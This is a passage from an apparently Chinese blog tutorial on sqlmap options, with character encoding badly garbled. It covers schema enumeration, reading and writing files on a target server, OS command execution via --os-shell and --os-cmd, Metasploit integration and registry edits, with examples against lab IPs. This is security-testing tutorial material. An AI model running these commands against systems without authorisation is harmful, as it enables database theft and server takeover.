alt="img"></p><h2 id="0x0B-sqlmap-æšä¸¾ä¿¡æ¯"><a href="#0x0B-sqlmap-æšä¸¾ä¿¡æ¯" class="headerlink" title="0x0B sqlmap æšä¸¾ä¿¡æ¯"></a>0x0B sqlmap æšä¸¾ä¿¡æ¯</h2><h3 id="11-1-æšä¸¾-schema-ä¿¡æ¯"><a href="#11-1-æšä¸¾-schema-ä¿¡æ¯" class="headerlink" title="11.1 æšä¸¾ schema ä¿¡æ¯"></a>11.1 æšä¸¾ schema ä¿¡æ¯</h3><p>ç”¨æˆ·å¯ä»¥ä½¿ç”¨æ­¤å¼€å…³â€“schemaæ£€ç´¢DBMSæ¨¡å¼ã€‚æ¨¡å¼åˆ—è¡¨å°†åŒ…å«æ‰€æœ‰æ•°æ®åº“ã€è¡¨å’Œåˆ—ï¼Œä»¥åŠå®ƒä»¬å„è‡ªçš„ç±»å‹ã€‚ä¸â€“exclude-sysdbç»“åˆä½¿ç”¨æ—¶ï¼Œåªä¼šæ£€ç´¢å’Œæ˜¾ç¤ºåŒ…å«éç³»ç»Ÿæ•°æ®åº“çš„æ¨¡å¼çš„ä¸€éƒ¨åˆ†ã€‚</p><p>python sqlmap.py -u â€œ<a href="http://192.168.48.130/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/mysql/get_int.php?id=1â€</a> â€“schemaâ€“batch â€“exclude-sysdbs </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020965.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024313.png" alt="img"></p><h3 id="11-2-æšä¸¾æ•°æ®è¡¨æ•°é‡"><a href="#11-2-æšä¸¾æ•°æ®è¡¨æ•°é‡" class="headerlink" title="11.2 æšä¸¾æ•°æ®è¡¨æ•°é‡"></a>11.2 æšä¸¾æ•°æ®è¡¨æ•°é‡</h3><p>å¦‚æœç”¨æˆ·åªæƒ³çŸ¥é“è¡¨ä¸­çš„æ¡ç›®æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨æ­¤å¼€å…³ã€‚ â€“count</p><p>python sqlmap.py -u â€œ<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1%E2%80%9D">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1â€</a> â€“count -D testdb</p><h3 id="11-3-è·å–æ•°æ®ä¿¡æ¯"><a href="#11-3-è·å–æ•°æ®ä¿¡æ¯" class="headerlink" title="11.3 è·å–æ•°æ®ä¿¡æ¯"></a>11.3 è·å–æ•°æ®ä¿¡æ¯</h3><p>â€“start, â€“stop, â€“first, â€“last</p><p>â€“start 1 â€“stop3 è·å–ç¬¬äºŒå¼ åˆ°ç¬¬ä¸‰å¼ è¡¨çš„åå­— â€“stop 1 è·å–ç¬¬ä¸€å¼ è¡¨çš„åå­— â€“first 3 â€“last 5 è·å–ä»ç¬¬ä¸‰å‡ºå‘åˆ°ç¬¬äº”ä¸ªå­—ç¬¦</p><h3 id="11-4-è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯"><a href="#11-4-è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯" class="headerlink" title="11.4 è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯"></a>11.4 è®¾ç½®æ¡ä»¶è·å–ä¿¡æ¯</h3><p>â€“pivot-column&#x3D;id è®¾ç½®ç‹¬ä¸€æ— äºŒçš„åˆ— â€“where&#x3D;â€œid&gt;3â€ è®¾ç½®æ¡ä»¶ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020507.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020887.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020079.png" alt="img"></p><h3 id="11-5-æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®"><a href="#11-5-æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®" class="headerlink" title="11.5 æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®"></a>11.5 æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹æ•°æ®</h3><p>ä½¿ç”¨åœºæ™¯ï¼šMysql&lt;5.0æ—¶ï¼ŒMysqlä¸­æ²¡æœ‰å…ƒæ•°æ®åº“ information_schemaã€‚ â€“common-tables æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹è¡¨å â€“common-columns æš´åŠ›æ¿€æ´»æˆåŠŸæ•™ç¨‹åˆ—å</p><h3 id="11-6-è¯»å–æ–‡ä»¶"><a href="#11-6-è¯»å–æ–‡ä»¶" class="headerlink" title="11.6 è¯»å–æ–‡ä»¶"></a>11.6 è¯»å–æ–‡ä»¶</h3><p>å‰æï¼šå·²çŸ¥ç›®æ ‡ä¸»æœºæ–‡ä»¶è·¯å¾„ â€“file-read è·¯å¾„ è¯»å–å¯¹åº”æ–‡ä»¶å†…å®¹ã€‚ æ³¨æ„ï¼šæ­¤å¤„è·¯å¾„ä¸ºç»å¯¹è·¯å¾„ã€‚ï¼ˆéœ€è¦ä½¿ç”¨&#x2F;&#x2F;,å…¶ä¸­ä¸€ä¸ª&#x2F;è¡¨ç¤ºè½¬ä¹‰ï¼‰ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024417.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024620.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024330.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024519.png" alt="img"></p><h3 id="11-7-å†™å…¥æ–‡ä»¶"><a href="#11-7-å†™å…¥æ–‡ä»¶" class="headerlink" title="11.7 å†™å…¥æ–‡ä»¶"></a>11.7 å†™å…¥æ–‡ä»¶</h3><p>â€“file-write è¯»å–æœ¬åœ°æ–‡ä»¶ â€“file-dest å°†è¯»å–åˆ°çš„æ–‡ä»¶å†™å…¥åˆ°è¿œç¨‹ç»å¯¹è·¯å¾„ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020518.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025438.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020987.png" alt="img"></p><h3 id="11-8-æ£€ç´¢æ‰€æœ‰ä¿¡æ¯"><a href="#11-8-æ£€ç´¢æ‰€æœ‰ä¿¡æ¯" class="headerlink" title="11.8 æ£€ç´¢æ‰€æœ‰ä¿¡æ¯"></a>11.8 æ£€ç´¢æ‰€æœ‰ä¿¡æ¯</h3><p>-a â€“all </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020256.png" alt="img"></p><h2 id="0x0C-sqlmap-ç³»ç»Ÿå‚æ•°"><a href="#0x0C-sqlmap-ç³»ç»Ÿå‚æ•°" class="headerlink" title="0x0C sqlmap ç³»ç»Ÿå‚æ•°"></a>0x0C sqlmap ç³»ç»Ÿå‚æ•°</h2><h3 id="12-1-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#12-1-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="12.1 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>12.1 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><p>å‰ææ¡ä»¶ï¼š</p><ol><li>ç½‘ç«™å¿…é¡»æ˜¯rootæƒé™</li><li>æ”»å‡»è€…éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</li><li>GPCä¸ºoffï¼ˆå³magic_quotes_gpc &#x3D; offï¼‰ï¼Œphpä¸»åŠ¨è½¬ä¹‰çš„åŠŸèƒ½å…³é—­</li><li>è‹¥éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ™secure_file_priv ä¸ä¸ºNULL</li></ol><p>â€“os-shell</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025967.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020059.png" alt="img"></p><h3 id="12-2-ç»“åˆMetasploit"><a href="#12-2-ç»“åˆMetasploit" class="headerlink" title="12.2 ç»“åˆMetasploit"></a>12.2 ç»“åˆMetasploit</h3><p>python sqlmap.py -u â€œæ³¨å…¥ç‚¹â€ â€“os-pwn â€“msf-path (è‹¥ä¸ä½¿ç”¨è¯¥å‚æ•°ï¼Œåˆ™è‡ªåŠ¨é€‰æ‹©é»˜è®¤è·¯å¾„) ï¼ˆåªé€‚ç”¨äºMySQL and PostgreSQL æ•°æ®åº“ï¼‰</p><h3 id="12-3-æ³¨å†Œè¡¨ä»‹ç»"><a href="#12-3-æ³¨å†Œè¡¨ä»‹ç»" class="headerlink" title="12.3 æ³¨å†Œè¡¨ä»‹ç»"></a>12.3 æ³¨å†Œè¡¨ä»‹ç»</h3><p>æ³¨å†Œè¡¨ï¼ˆRegistryï¼Œç¹ä½“ä¸­æ–‡ç‰ˆWindowsæ“ä½œç³»ç»Ÿç§°ä¹‹ä¸ºç™»å½•æ¡£ï¼‰æ˜¯Microsoft Windowsä¸­çš„ä¸€ä¸ªé‡è¦çš„æ•°æ®åº“ï¼Œç”¨äºå­˜å‚¨ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„è®¾ç½®ä¿¡æ¯ã€‚æ—©åœ¨Windows 3.0æ¨å‡ºOLEæŠ€æœ¯çš„æ—¶å€™ï¼Œæ³¨å†Œè¡¨å°±å·²ç»å‡ºç°ã€‚éšåæ¨å‡ºçš„Windows NTæ˜¯ç¬¬ä¸€ä¸ªä»ç³»ç»Ÿçº§åˆ«å¹¿æ³›ä½¿ç”¨æ³¨å†Œè¡¨çš„æ“ä½œç³»ç»Ÿã€‚ä½†æ˜¯ï¼Œä»Microsoft Windows 95æ“ä½œç³»ç»Ÿå¼€å§‹ï¼Œæ³¨å†Œè¡¨æ‰çœŸæ­£æˆä¸ºWindowsç”¨æˆ·ç»å¸¸æ¥è§¦çš„å†…å®¹ï¼Œå¹¶åœ¨å…¶åçš„æ“ä½œç³»ç»Ÿä¸­ç»§ç»­æ²¿ç”¨è‡³ä»Šã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020490.png" alt="img"></p><h3 id="12-4-æ³¨å†Œè¡¨æ“ä½œ"><a href="#12-4-æ³¨å†Œè¡¨æ“ä½œ" class="headerlink" title="12.4 æ³¨å†Œè¡¨æ“ä½œ"></a>12.4 æ³¨å†Œè¡¨æ“ä½œ</h3><p>â€“reg-read â€“reg-add â€“reg-del â€“reg-key, â€“reg-value, â€“reg-data â€“reg-type</p><p>ä¾‹å¦‚ï¼š $ python sqlmap.py -u <a href="http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1">http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</a> â€“reg-add â€“reg-key&#x3D;â€œHKEY_LOCAL_MACHINE\SOFTWARE\sqlmapâ€ â€“reg-value&#x3D;Test â€“reg-type&#x3D;REG_SZ â€“reg-data&#x3D;1</p><h2 id="0x0D-sqlmap-é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰"><a href="#0x0D-sqlmap-é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰" class="headerlink" title="0x0D sqlmap é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰"></a>0x0D sqlmap é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰</h2><h3 id="13-1-åŠ è½½-sqlite-ä¼šè¯æ–‡ä»¶"><a href="#13-1-åŠ è½½-sqlite-ä¼šè¯æ–‡ä»¶" class="headerlink" title="13.1 åŠ è½½ sqlite ä¼šè¯æ–‡ä»¶"></a>13.1 åŠ è½½ sqlite ä¼šè¯æ–‡ä»¶</h3><p>sqlmapè‡ªåŠ¨ä¸ºæ¯ä¸ªç›®æ ‡åˆ›å»ºæŒä¹…ä¼šè¯SQLiteæ–‡ä»¶ï¼Œä½äºä¸“ç”¨è¾“å‡ºç›®å½•ä¸­ï¼Œå…¶ä¸­å­˜å‚¨ä¼šè¯æ¢å¤æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚å¦‚æœç”¨æˆ·æƒ³æ˜¾å¼åœ°è®¾ç½®ä¼šè¯æ–‡ä»¶ä½ç½®(ä¾‹å¦‚åœ¨ä¸€ä¸ªä½ç½®ä¸ºå¤šä¸ªç›®æ ‡å­˜å‚¨ä¼šè¯æ•°æ®)ï¼Œå¯ä»¥ä½¿ç”¨æ­¤é€‰é¡¹ã€‚</p><p>-s â€œä¼šè¯æ–‡ä»¶â€</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025437.png" alt="img"></p><h3 id="13-2-åŠ è½½-http-æ–‡æœ¬æ–‡ä»¶"><a href="#13-2-åŠ è½½-http-æ–‡æœ¬æ–‡ä»¶" class="headerlink" title="13.2 åŠ è½½ http æ–‡æœ¬æ–‡ä»¶"></a>13.2 åŠ è½½ http æ–‡æœ¬æ–‡ä»¶</h3><p>è¿™ä¸ªé€‰é¡¹éœ€è¦æŒ‡å®šæ–‡æœ¬æ–‡ä»¶çš„å‚æ•°æ¥å†™å…¥sqlmap â€“ HTTP(s)è¯·æ±‚å’ŒHTTP(s)å“åº”ç”Ÿæˆçš„æ‰€æœ‰HTTP(s)æµé‡ã€‚ è¿™ä¸»è¦ç”¨äºè°ƒè¯•ç›®çš„â€”â€”å½“æ‚¨å‘å¼€å‘äººå‘˜æä¾›ä¸€ä¸ªæ½œåœ¨çš„bugæŠ¥å‘Šæ—¶ï¼Œä¹Ÿå‘é€è¿™ä¸ªæ–‡ä»¶ã€‚ -t å‚æ•° </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020819.png" alt="img"></p><h3 id="13-3-è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹"><a href="#13-3-è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹" class="headerlink" title="13.3 è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹"></a>13.3 è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹</h3><p>å¦‚æœå¸Œæœ›sqlmapä½œä¸ºæ‰¹å¤„ç†å·¥å…·è¿è¡Œï¼Œåœ¨sqlmapéœ€è¦æ—¶ä¸éœ€è¦ä»»ä½•ç”¨æˆ·äº¤äº’ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨â€”â€“batchæ¥å¼ºåˆ¶æ‰§è¡Œã€‚è¿™å°†ä½¿sqlmapåœ¨éœ€è¦ç”¨æˆ·è¾“å…¥æ—¶ä¿æŒé»˜è®¤è¡Œä¸ºã€‚</p><h3 id="13-4-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#13-4-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="13.4 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>13.4 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><p>â€“os-cmd&#x3D;â€å‘½ä»¤â€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025236.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020532.png" alt="img"></p><h3 id="13-5-è®¾ç½®ç›²æ³¨å­—ç¬¦é›†"><a href="#13-5-è®¾ç½®ç›²æ³¨å­—ç¬¦é›†" class="headerlink" title="13.5 è®¾ç½®ç›²æ³¨å­—ç¬¦é›†"></a>13.5 è®¾ç½®ç›²æ³¨å­—ç¬¦é›†</h3><p>åœ¨åŸºäºå¸ƒå°”å’ŒåŸºäºæ—¶é—´çš„SQLç›²æ³¨ä¸­ï¼Œç”¨æˆ·å¯ä»¥å¼ºåˆ¶ä½¿ç”¨è‡ªå®šä¹‰å­—ç¬¦é›†æ¥åŠ é€Ÿæ•°æ®æ£€ç´¢è¿‡ç¨‹ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè½¬å‚¨æ¶ˆæ¯æ‘˜è¦å€¼(ä¾‹å¦‚SHA1)ï¼Œåˆ™ä½¿ç”¨â€“charset&#x3D;â€œ0123456789abcdefâ€ï¼Œé¢„æœŸè¯·æ±‚æ•°é‡æ¯”æ­£å¸¸è¿è¡Œå°‘30%å·¦å³ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025360.png" alt="img"></p><h3 id="13-6-çˆ¬å–-URL"><a href="#13-6-çˆ¬å–-URL" class="headerlink" title="13.6 çˆ¬å– URL"></a>13.6 çˆ¬å– URL</h3><p>sqlmapå¯ä»¥é€šè¿‡ä»ç›®æ ‡ä½ç½®å¼€å§‹æ”¶é›†é“¾æ¥(çˆ¬è¡Œ)æ¥æ”¶é›†æ½œåœ¨çš„è„†å¼±é“¾æ¥ã€‚ä½¿ç”¨æ­¤é€‰é¡¹ï¼Œç”¨æˆ·å¯ä»¥è®¾ç½®ä¸€ä¸ªæ·±åº¦(åˆ°èµ·å§‹ä½ç½®çš„è·ç¦»)ï¼Œä½äºè¿™ä¸ªæ·±åº¦ï¼Œsqlmapä¸ä¼šè¿›å…¥æ”¶é›†é˜¶æ®µï¼Œå› ä¸ºåªè¦æœ‰æ–°çš„é“¾æ¥è¦è®¿é—®ï¼Œå°±ä¼šé€’å½’åœ°æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ã€‚ â€“crawl python sqlmap.py -u â€œ<a href="http://192.168.21.128/sqlmap/mysql/%E2%80%9D">http://192.168.21.128/sqlmap/mysql/â€</a> â€“batch â€“crawl&#x3D;3 â€“crawl-exclude å­—ç¬¦ä¸² å­˜åœ¨å­—ç¬¦ä¸²çš„URLä¸è¿›è¡Œçˆ¬å–</p><h3 id="13-7-åœ¨-CSV-è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦"><a href="#13-7-åœ¨-CSV-è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦" class="headerlink" title="13.7 åœ¨ CSV è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦"></a>13.7 åœ¨ CSV è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦</h3><p>å½“è¢«è½¬å‚¨çš„<a href="https://cloud.tencent.com/product/cos?from_column=20065&from=20065">æ•°æ®å­˜å‚¨</a>åˆ°CSVæ ¼å¼(â€“dump-format&#x3D;CSV)æ—¶ï¼Œæ¡ç›®å¿…é¡»ç”¨â€œåˆ†ç¦»å€¼â€åˆ†éš”(é»˜è®¤å€¼æ˜¯ â€ï¼Œâ€)ã€‚å¦‚æœç”¨æˆ·æƒ³è¦è¦†ç›–å®ƒçš„é»˜è®¤å€¼ï¼Œä»–å¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹(ä¾‹å¦‚â€“csv-del&#x3D;â€@â€)ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025576.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020699.png" alt="img"></p><h3 id="13-8-è®¾ç½®è¾“å‡ºæ ¼å¼"><a href="#13-8-è®¾ç½®è¾“å‡ºæ ¼å¼" class="headerlink" title="13.8 è®¾ç½®è¾“å‡ºæ ¼å¼"></a>13.8 è®¾ç½®è¾“å‡ºæ ¼å¼</h3><p>å½“å°†è½¬å‚¨è¡¨æ•°æ®å­˜å‚¨åˆ°è¾“å‡ºç›®å½•ä¸­çš„ç›¸åº”æ–‡ä»¶ä¸­æ—¶ï¼Œsqlmapæ”¯æŒä¸‰ç§ä¸åŒçš„æ ¼å¼:CSVã€HTMLå’ŒSQLITEã€‚é»˜è®¤çš„æ˜¯CSVï¼Œå…¶ä¸­æ¯ä¸ªè¡¨è¡Œä¸€è¡Œä¸€è¡Œåœ°å­˜å‚¨åœ¨æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªæ¡ç›®ç”¨é€—å·åˆ†éš”(æˆ–æä¾›äº†é€‰é¡¹â€“csv-del)ã€‚å¯¹äºHTMLï¼Œè¾“å‡ºè¢«å­˜å‚¨åˆ°ä¸€ä¸ªHTMLæ–‡ä»¶ä¸­ï¼Œå…¶ä¸­æ¯ä¸€è¡Œéƒ½ç”¨æ ¼å¼åŒ–è¡¨ä¸­çš„ä¸€è¡Œè¡¨ç¤ºã€‚å¯¹äºSQLITEï¼Œè¾“å‡ºå­˜å‚¨åœ¨SQLITEæ•°æ®åº“ä¸­ï¼ŒåŸå§‹è¡¨å†…å®¹å¤åˆ¶åˆ°åŒåçš„ç›¸åº”è¡¨ä¸­ã€‚</p><p>â€“dump-format</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020870.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025291.png" alt="img"></p><h3 id="13-9-æ¢æµ‹ä¹‹å‰æ£€æµ‹-Internet-è¿æ¥"><a href="#13-9-æ¢æµ‹ä¹‹å‰æ£€æµ‹-Internet-è¿æ¥" class="headerlink" title="13.9 æ¢æµ‹ä¹‹å‰æ£€æµ‹ Internet è¿æ¥"></a>13.9 æ¢æµ‹ä¹‹å‰æ£€æµ‹ Internet è¿æ¥</h3><p>åœ¨è¿›è¡Œè¯„ä¼°ç›®æ ‡ä¹‹å‰ï¼Œæ£€æµ‹å½“å‰è®¡ç®—æœºInternetè¿æ¥æ˜¯å¦æ­£å¸¸ã€‚ç¡®ä¿æ¢æµ‹å¤±è´¥ä¸æ˜¯å› ä¸ºç½‘è·¯æ‹¦æˆªé—®é¢˜ã€‚</p><p>â€“check-internet </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020547.png" alt="img"></p><h3 id="13-10-è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ"><a href="#13-10-è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ" class="headerlink" title="13.10 è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ"></a>13.10 è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ</h3><p>â€“form </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020372.png" alt="img"></p><h2 id="0x0E-sqlmap-é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰"><a href="#0x0E-sqlmap-é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰" class="headerlink" title="0x0E sqlmap é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰"></a>0x0E sqlmap é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰</h2><h3 id="14-1-è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´"><a href="#14-1-è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´" class="headerlink" title="14.1 è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´"></a>14.1 è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´</h3><p>å¯ä»¥å®æ—¶åœ°è®¡ç®—å’Œæ˜¾ç¤ºä¼°è®¡çš„åˆ°è¾¾æ—¶é—´ï¼Œä»¥æ£€ç´¢æ¯ä¸ªæŸ¥è¯¢è¾“å‡ºã€‚å½“ç”¨äºæ£€ç´¢è¾“å‡ºçš„æŠ€æœ¯æ˜¯ä»»ä½•ç›²SQLæ³¨å…¥ç±»å‹æ—¶ï¼Œå°±ä¼šæ˜¾ç¤ºè¿™ä¸€ç‚¹ã€‚ â€“eta </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025872.png" alt="img"></p><h3 id="14-2-åˆ·æ–°ä¼šè¯æ–‡ä»¶"><a href="#14-2-åˆ·æ–°ä¼šè¯æ–‡ä»¶" class="headerlink" title="14.2 åˆ·æ–°ä¼šè¯æ–‡ä»¶"></a>14.2 åˆ·æ–°ä¼šè¯æ–‡ä»¶</h3><p>ç”±äºä¼šè¯æ–‡ä»¶çš„æ¦‚å¿µï¼Œæ‰€ä»¥æœ€å¥½çŸ¥é“æ‚¨å¯ä»¥ä½¿ç”¨é€‰é¡¹â€“flush-sessionåˆ·æ–°è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ‚¨å¯ä»¥é¿å…sqlmapä¸­é»˜è®¤å®ç°çš„ç¼“å­˜æœºåˆ¶ã€‚å…¶ä»–å¯èƒ½çš„æ–¹æ³•æ˜¯æ‰‹åŠ¨åˆ é™¤ä¼šè¯æ–‡ä»¶ã€‚</p><h3 id="14-3-å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ"><a href="#14-3-å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ" class="headerlink" title="14.3 å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ"></a>14.3 å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ</h3><p>ä½¿ç”¨é€‰é¡¹â€“fresh-queriesæ¥å¿½ç•¥è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ä¿æŒä¼šè¯æ–‡ä»¶ä¸å˜ï¼Œå¯¹äºæ‰€é€‰çš„è¿è¡Œï¼Œé¿å…æ¢å¤&#x2F;æ¢å¤æŸ¥è¯¢è¾“å‡ºã€‚</p><h3 id="14-4-ä½¿ç”¨-Hex-å‡½æ•°æ£€ç´¢æ•°æ®"><a href="#14-4-ä½¿ç”¨-Hex-å‡½æ•°æ£€ç´¢æ•°æ®" class="headerlink" title="14.4 ä½¿ç”¨ Hex å‡½æ•°æ£€ç´¢æ•°æ®"></a>14.4 ä½¿ç”¨ Hex å‡½æ•°æ£€ç´¢æ•°æ®</h3><p>éasciiæ•°æ®çš„æ£€ç´¢éœ€è¦ç‰¹æ®Šçš„éœ€æ±‚ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ä¸ªæ–¹æ³•æ˜¯ä½¿ç”¨DBMS hexå‡½æ•°ã€‚æ•°æ®åœ¨è¢«æ£€ç´¢ä¹‹å‰è¢«ç¼–ç ä¸ºåå…­è¿›åˆ¶å½¢å¼ï¼Œç„¶åè¢«æœªç¼–ç ä¸ºåŸå§‹å½¢å¼ã€‚</p><p>â€“hex</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1â€</a> â€“hex -v 3 â€“batch</p><h3 id="14-5-è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„"><a href="#14-5-è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„" class="headerlink" title="14.5 è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„"></a>14.5 è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„</h3><p>sqlmapé»˜è®¤å°†ä¼šè¯å’Œç»“æœæ–‡ä»¶å­˜å‚¨åœ¨å­ç›®å½•è¾“å‡ºä¸­ã€‚å¦‚æœæ‚¨æƒ³ä½¿ç”¨ä¸åŒçš„ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹(ä¾‹å¦‚â€“output-dir&#x3D;&#x2F;tmp)ã€‚</p><h3 id="14-6-ä»å“åº”é¡µé¢è§£æé”™è¯¯"><a href="#14-6-ä»å“åº”é¡µé¢è§£æé”™è¯¯" class="headerlink" title="14.6 ä»å“åº”é¡µé¢è§£æé”™è¯¯"></a>14.6 ä»å“åº”é¡µé¢è§£æé”™è¯¯</h3><p>å¦‚æœwebåº”ç”¨ç¨‹åºé…ç½®ä¸ºè°ƒè¯•æ¨¡å¼ï¼Œä»¥ä¾¿åœ¨HTTPå“åº”ä¸­æ˜¾ç¤ºåç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿé”™è¯¯æ¶ˆæ¯ï¼Œsqlmapå¯ä»¥è§£æå¹¶æ˜¾ç¤ºå®ƒä»¬ã€‚è¿™å¯¹äºè°ƒè¯•å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚ç†è§£ä¸ºä»€ä¹ˆæŸä¸ªæšä¸¾æˆ–æ¥ç®¡å¼€å…³ä¸èµ·ä½œç”¨â€”â€”è¿™å¯èƒ½ä¸ä¼šè¯ç”¨æˆ·çš„ç‰¹æƒæœ‰å…³ â€“parse-error</p><p>ä¿å­˜Sqlmapé…ç½®æ–‡ä»¶ â€“save 